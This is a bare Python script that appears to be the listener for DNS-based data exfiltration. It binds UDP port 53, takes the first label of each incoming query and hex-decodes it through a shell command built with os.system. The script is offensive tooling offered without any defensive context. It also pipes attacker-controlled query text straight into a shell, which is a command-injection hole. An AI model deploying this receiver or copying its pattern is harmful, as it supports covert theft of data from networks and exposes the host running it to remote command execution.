import socket 
import sys
import os 

from dnslib import DNSRecord

server = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
server.bind(('0.0.0.0', 53))

while True: 
 data, addr = server.recvfrom(4096) 
 d = DNSRecord.parse(data)
 x = repr(d.questions[0]._qname)
 y = x.split(".")
 oline = (y[0].lstrip('<DNSLabel: \''))
 pline = "echo " + oline + " | xxd -r -p"
 os.system(pline)

